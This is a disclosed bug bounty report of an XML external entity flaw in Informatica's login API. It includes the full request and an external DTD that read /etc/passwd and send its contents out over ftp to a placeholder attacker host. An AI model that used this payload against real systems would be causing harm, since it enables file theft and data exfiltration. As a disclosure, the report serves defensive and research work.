# [app.informaticaondemand.com] XXE

## Report Details
- **Report ID**: 105753
- **URL**: https://hackerone.com/reports/105753
- **State**: Closed
- **Severity**: high
- **Submitted**: 2015-12-17T10:57:14.283Z
- **Disclosed**: 2017-04-08T10:07:19.915Z

## Reporter
- **Username**: yarbabin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Request:
POST /ma/api/v2/user/login HTTP/1.1
Host: app.informaticaondemand.com
Content-Length: 285
Content-Type: application/xml
Accept: application/xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
%asd;
%rrr;]>
<login><username>demo@informatica.com</username><password>Infa123</password></login>

Where xx.html:
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;

Then i got file /etc/passwd (xxe_app.png)


## Attachments
- xxe_app.png
- xxe_app_get.png
